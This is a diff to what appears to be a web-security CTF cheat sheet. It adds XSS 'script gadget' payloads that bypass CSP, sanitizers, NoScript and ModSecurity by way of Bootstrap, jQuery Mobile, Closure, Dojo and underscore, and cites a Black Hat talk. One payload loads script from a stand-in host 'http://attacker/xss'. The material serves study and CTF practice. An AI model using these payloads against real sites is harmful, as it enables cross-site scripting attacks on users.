@@ -2145,8 +2145,22 @@ https://csp-evaluator.withgoogle.com/
      <script src="xxx" nonce="AAAAAAAAAAA"></script>
     ```
 
+- Script Gadget
+    - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
+    - is an **existing** JS code on the page that may be used to bypass mitigations
+    - Bypassing CSP strict-dynamic via Bootstrap
+        - `<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'></div>`
+    - Bypassing sanitizers via jQuery Mobile
+        - `<div data-role=popup id='--><script>alert(1)</script>'></div>`
+    - Bypassing NoScript via Closure (DOM clobbering)
+        - `<a id=CLOSURE_BASE_PATH href=http://attacker/xss></a>`
+    - Bypassing ModSecurity CRS via Dojo Toolkit
+        - `<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">`
+    - Bypassing CSP unsafe-eval via underscore templates
+        - `<div type=underscore/template> <% alert(1) %> </div>`
+    - 0CTF 2018 - h4xors.club2
 - google analytics ea
-    - ea is used to log actions and can contain arbitary string
+    - ea is used to log actions and can contain arbitrary string
     - Google CTF 2018 - gcalc2
 
 
